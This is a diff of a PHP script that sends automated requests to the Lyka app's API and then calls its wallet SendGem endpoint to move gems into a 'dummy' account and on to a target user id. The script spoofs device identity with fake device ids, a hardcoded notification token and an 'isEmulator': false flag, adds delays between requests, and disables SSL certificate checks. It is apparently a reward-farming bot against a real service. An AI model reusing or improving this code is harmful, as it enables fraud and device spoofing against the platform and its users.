+    curl_setopt($curl6, CURLOPT_HTTPHEADER, $headers);
+    $data36 = <<<DATA
 {
 	
   "device": {
@@ -1985,21 +2030,22 @@ $data36 = <<<DATA
    "userid": $huid
 }
 DATA;
-curl_setopt($curl6, CURLOPT_POSTFIELDS, $data36);
-$resp6 = curl_exec($curl6);
-curl_close($curl6);
-//var_dump($resp2);
-$json6 = json_decode($resp6);
-echo $json6->message;
-echo "
+    curl_setopt($curl6, CURLOPT_POSTFIELDS, $data36);
+    $resp6 = curl_exec($curl6);
+    curl_close($curl6);
+    //var_dump($resp2);
+    $json6 = json_decode($resp6);
+    echo $json6->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl7 = curl_init($url);
-curl_setopt($curl7, CURLOPT_URL, $url);
-curl_setopt($curl7, CURLOPT_POST, true);
-curl_setopt($curl7, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl7, CURLOPT_HTTPHEADER, $headers);
-$data37 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl7 = curl_init($url);
+    curl_setopt($curl7, CURLOPT_URL, $url);
+    curl_setopt($curl7, CURLOPT_POST, true);
+    curl_setopt($curl7, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl7, CURLOPT_HTTPHEADER, $headers);
+    $data37 = <<<DATA
 {
 	
   "device": {
@@ -2017,21 +2063,22 @@ $data37 = <<<DATA
    "userid": $huid
 }
 DATA;
-curl_setopt($curl7, CURLOPT_POSTFIELDS, $data37);
-$resp7 = curl_exec($curl7);
-curl_close($curl7);
-//var_dump($resp2);
-$json7 = json_decode($resp7);
-echo $json7->message;
-echo "
+    curl_setopt($curl7, CURLOPT_POSTFIELDS, $data37);
+    $resp7 = curl_exec($curl7);
+    curl_close($curl7);
+    //var_dump($resp2);
+    $json7 = json_decode($resp7);
+    echo $json7->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl8 = curl_init($url);
-curl_setopt($curl8, CURLOPT_URL, $url);
-curl_setopt($curl8, CURLOPT_POST, true);
-curl_setopt($curl8, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl8, CURLOPT_HTTPHEADER, $headers);
-$data38 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl8 = curl_init($url);
+    curl_setopt($curl8, CURLOPT_URL, $url);
+    curl_setopt($curl8, CURLOPT_POST, true);
+    curl_setopt($curl8, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl8, CURLOPT_HTTPHEADER, $headers);
+    $data38 = <<<DATA
 {
 	
   "device": {
@@ -2049,21 +2096,22 @@ $data38 = <<<DATA
    "userid": $huid
 }
 DATA;
-curl_setopt($curl8, CURLOPT_POSTFIELDS, $data38);
-$resp8 = curl_exec($curl8);
-curl_close($curl8);
-//var_dump($resp2);
-$json8 = json_decode($resp8);
-echo $json8->message;
-echo "
+    curl_setopt($curl8, CURLOPT_POSTFIELDS, $data38);
+    $resp8 = curl_exec($curl8);
+    curl_close($curl8);
+    //var_dump($resp2);
+    $json8 = json_decode($resp8);
+    echo $json8->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl9 = curl_init($url);
-curl_setopt($curl9, CURLOPT_URL, $url);
-curl_setopt($curl9, CURLOPT_POST, true);
-curl_setopt($curl9, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl9, CURLOPT_HTTPHEADER, $headers);
-$data39 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl9 = curl_init($url);
+    curl_setopt($curl9, CURLOPT_URL, $url);
+    curl_setopt($curl9, CURLOPT_POST, true);
+    curl_setopt($curl9, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl9, CURLOPT_HTTPHEADER, $headers);
+    $data39 = <<<DATA
 {
 	
   "device": {
@@ -2081,21 +2129,22 @@ $data39 = <<<DATA
    "userid": $huid
 }
 DATA;
-curl_setopt($curl9, CURLOPT_POSTFIELDS, $data39);
-$resp9 = curl_exec($curl9);
-curl_close($curl9);
-//var_dump($resp2);
-$json9 = json_decode($resp9);
-echo $json9->message;
-echo "
+    curl_setopt($curl9, CURLOPT_POSTFIELDS, $data39);
+    $resp9 = curl_exec($curl9);
+    curl_close($curl9);
+    //var_dump($resp2);
+    $json9 = json_decode($resp9);
+    echo $json9->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl11 = curl_init($url);
-curl_setopt($curl11, CURLOPT_URL, $url);
-curl_setopt($curl11, CURLOPT_POST, true);
-curl_setopt($curl11, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl11, CURLOPT_HTTPHEADER, $headers);
-$data311 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl11 = curl_init($url);
+    curl_setopt($curl11, CURLOPT_URL, $url);
+    curl_setopt($curl11, CURLOPT_POST, true);
+    curl_setopt($curl11, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl11, CURLOPT_HTTPHEADER, $headers);
+    $data311 = <<<DATA
 {
 	
   "device": {
@@ -2113,21 +2162,22 @@ $data311 = <<<DATA
    "userid": $huid
 }
 DATA;
-curl_setopt($curl11, CURLOPT_POSTFIELDS, $data311);
-$resp11 = curl_exec($curl11);
-curl_close($curl11);
-//var_dump($resp2);
-$json11 = json_decode($resp11);
-echo $json11->message;
-echo "
+    curl_setopt($curl11, CURLOPT_POSTFIELDS, $data311);
+    $resp11 = curl_exec($curl11);
+    curl_close($curl11);
+    //var_dump($resp2);
+    $json11 = json_decode($resp11);
+    echo $json11->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl10 = curl_init($url);
-curl_setopt($curl10, CURLOPT_URL, $url);
-curl_setopt($curl10, CURLOPT_POST, true);
-curl_setopt($curl10, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl10, CURLOPT_HTTPHEADER, $headers);
-$data310 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl10 = curl_init($url);
+    curl_setopt($curl10, CURLOPT_URL, $url);
+    curl_setopt($curl10, CURLOPT_POST, true);
+    curl_setopt($curl10, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl10, CURLOPT_HTTPHEADER, $headers);
+    $data310 = <<<DATA
 {
 	
   "device": {
@@ -2145,48 +2195,48 @@ $data310 = <<<DATA
    "userid": $huid
 }
 DATA;
-curl_setopt($curl10, CURLOPT_POSTFIELDS, $data310);
-$resp10 = curl_exec($curl10);
-curl_close($curl10);
-//var_dump($resp2);
-$json10 = json_decode($resp10);
-echo $json10->message;
-$urlbals = "https://wallets.mylykaapps.com/api/v3/wallets/SendGem";
-$curlbals = curl_init($urlbals);
-curl_setopt($curlbals, CURLOPT_URL, $urlbals);
-curl_setopt($curlbals, CURLOPT_POST, true);
-curl_setopt($curlbals, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curlbals, CURLOPT_HTTPHEADER, $headers);
-$databals = '{"amount":"' . 0.50 . '","device":{"deviceId":"fcaa86b842595c2f","deviceImei":"fcaa86b842595c2f","deviceModel":"Xiaomi Redmi Note 5","deviceName":"android","deviceOs":"Android O_MR1 ","isEmulator":false,"notificationToken":"eFEXEC5pTAeXLu7JjIlpNX:APA91bF8I2ZGs8wUNDjpw5lSnzrz8fB652HYMxWBdTGtFRSUaBEd0pHZQvWXAd00ESKVUO_VtYieRQxtfEU7f3RUIHEs5zXGZSVqk5PfbzjZTJQcue0vHYRiEobXHk8JUlTa0nmPCdgR","osVersion":"28"},"recipientId":' . 700013398035 . '}';
-curl_setopt($curlbals, CURLOPT_POSTFIELDS, $databals);
-$respbals = curl_exec($curlbals);
-curl_close($curlbals);
-//var_dump($respbals);
-$jsonbals = json_decode($respbals);
-$urlbal2 = "https://wallets.mylykaapps.com/api/v3/wallets/getgems?os=android";
-$curlbal2 = curl_init($urlbal2);
-curl_setopt($curlbal2, CURLOPT_URL, $urlbal2);
-curl_setopt($curlbal2, CURLOPT_RETURNTRANSFER, true);
-$headersbal2 = array("authorization: Bearer $bearer",);
-curl_setopt($curlbal2, CURLOPT_HTTPHEADER, $headersbal2);
-//for debug only!
-curl_setopt($curlbal2, CURLOPT_SSL_VERIFYHOST, false);
-curl_setopt($curlbal2, CURLOPT_SSL_VERIFYPEER, false);
-$respbal2 = curl_exec($curlbal2);
-curl_close($curlbal2);
-//var_dump($respbal);
-$jsonbal2 = json_decode($respbal2);
-$tg2 = $jsonbal2->data->totalGem;
-$fbal = $tg2 - $tg;
-echo "
+    curl_setopt($curl10, CURLOPT_POSTFIELDS, $data310);
+    $resp10 = curl_exec($curl10);
+    curl_close($curl10);
+    //var_dump($resp2);
+    $json10 = json_decode($resp10);
+    echo $json10->message;
+    $urlbals = "https://wallets.mylykaapps.com/api/v3/wallets/SendGem";
+    $curlbals = curl_init($urlbals);
+    curl_setopt($curlbals, CURLOPT_URL, $urlbals);
+    curl_setopt($curlbals, CURLOPT_POST, true);
+    curl_setopt($curlbals, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curlbals, CURLOPT_HTTPHEADER, $headers);
+    $databals = '{"amount":"' . 0.60 . '","device":{"deviceId":"fcaa86b842595c2f","deviceImei":"fcaa86b842595c2f","deviceModel":"Xiaomi Redmi Note 5","deviceName":"android","deviceOs":"Android O_MR1 ","isEmulator":false,"notificationToken":"eFEXEC5pTAeXLu7JjIlpNX:APA91bF8I2ZGs8wUNDjpw5lSnzrz8fB652HYMxWBdTGtFRSUaBEd0pHZQvWXAd00ESKVUO_VtYieRQxtfEU7f3RUIHEs5zXGZSVqk5PfbzjZTJQcue0vHYRiEobXHk8JUlTa0nmPCdgR","osVersion":"28"},"recipientId":' .  700013398035  . '}';
+    curl_setopt($curlbals, CURLOPT_POSTFIELDS, $databals);
+    $respbals = curl_exec($curlbals);
+    curl_close($curlbals);
+    //var_dump($respbals);
+    $jsonbals = json_decode($respbals);
+    $urlbal2 = "https://wallets.mylykaapps.com/api/v3/wallets/getgems?os=android";
+    $curlbal2 = curl_init($urlbal2);
+    curl_setopt($curlbal2, CURLOPT_URL, $urlbal2);
+    curl_setopt($curlbal2, CURLOPT_RETURNTRANSFER, true);
+    $headersbal2 = array("authorization: Bearer $bearer",);
+    curl_setopt($curlbal2, CURLOPT_HTTPHEADER, $headersbal2);
+    //for debug only!
+    curl_setopt($curlbal2, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($curlbal2, CURLOPT_SSL_VERIFYPEER, false);
+    $respbal2 = curl_exec($curlbal2);
+    curl_close($curlbal2);
+    //var_dump($respbal);
+    $jsonbal2 = json_decode($respbal2);
+    $tg2 = $jsonbal2->data->totalGem;
+    $fbal = $tg2 - $tg;
+    echo "
 DUMMY BALANCE $tg2 GEMS
 
 ";
-echo "
+    echo "
 Added gems to dummy: +$fbal GEMS
 ";
-///////////
-/*
+    ///////////
+    /*
     $urlbal2 = "https://wallets.mylykaapps.com/api/v3/wallets/getgems?os=android";
     
     
@@ -2217,22 +2267,30 @@ Added gems to dummy: +$fbal GEMS
     Added gems to dummy: +$fbal GEMS
     ";
     ///////////
-*/
-$urlbals = "https://wallets.mylykaapps.com/api/v3/wallets/SendGem";
-$curlbals = curl_init($urlbals);
-curl_setopt($curlbals, CURLOPT_URL, $urlbals);
-curl_setopt($curlbals, CURLOPT_POST, true);
-curl_setopt($curlbals, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curlbals, CURLOPT_HTTPHEADER, $headers);
-$databals = '{"amount":"' . $tg2 . '","device":{"deviceId":"fcbe87b62342fbac","deviceImei":"fcbe87b62342fbac","deviceModel":"Xiaomi Redmi Note 10","deviceName":"android","deviceOs":"Android O_MR1","isEmulator":false,"notificationToken":"eFEXEC5pTAeXLu7JjIlpNX:APA91bF8I2ZGs8wUNDjpw5lSnzrz8fB652HYMxWBdTGtFRSUaBEd0pHZQvWXAd00ESKVUO_VtYieRQxtfEU7f3RUIHEs5zXGZSVqk5PfbzjZTJQcue0vHYRiEobXHk8JUlTa0nmPCdgR","osVersion":"28"},"recipientId":' . $uid . '}';
-curl_setopt($curlbals, CURLOPT_POSTFIELDS, $databals);
-$respbals = curl_exec($curlbals);
-curl_close($curlbals);
-//var_dump($respbals);
-$jsonbals = json_decode($respbals);
-echo $jsonbals->message;
-echo "
+    */
+    $urlbals = "https://wallets.mylykaapps.com/api/v3/wallets/SendGem";
+    $curlbals = curl_init($urlbals);
+    curl_setopt($curlbals, CURLOPT_URL, $urlbals);
+    curl_setopt($curlbals, CURLOPT_POST, true);
+    curl_setopt($curlbals, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curlbals, CURLOPT_HTTPHEADER, $headers);
+    $databals = '{"amount":"' . $tg2 . '","device":{"deviceId":"$glue","deviceImei":"$glue","deviceModel":"Xiaomi Redmi Note 10","deviceName":"android","deviceOs":"Android O_MR1","isEmulator":false,"notificationToken":"eFEXEC5pTAeXLu7JjIlpNX:APA91bF8I2ZGs8wUNDjpw5lSnzrz8fB652HYMxWBdTGtFRSUaBEd0pHZQvWXAd00ESKVUO_VtYieRQxtfEU7f3RUIHEs5zXGZSVqk5PfbzjZTJQcue0vHYRiEobXHk8JUlTa0nmPCdgR","osVersion":"28"},"recipientId":' . $uid . '}';
+    curl_setopt($curlbals, CURLOPT_POSTFIELDS, $databals);
+    $respbals = curl_exec($curlbals);
+    curl_close($curlbals);
+    //var_dump($respbals);
+    $jsonbals = json_decode($respbals);
+    echo $jsonbals->message;
+    echo "
 ";
+    echo "
+";
+    echo "=====================================================";
+    $yellow = "[0;32m";
+    echo "$yellow";
+    echo "
+";
+}
 /*
     $urlog = "https://users.mylykaapps.com/api/v3/users/logoutuser";
     
@@ -2274,6 +2332,4 @@ echo "
     //echo "$jsonog->message";
     
 */
-echo "User was logout";
-echo "
-";
+//echo "MESSAGE: $messw;
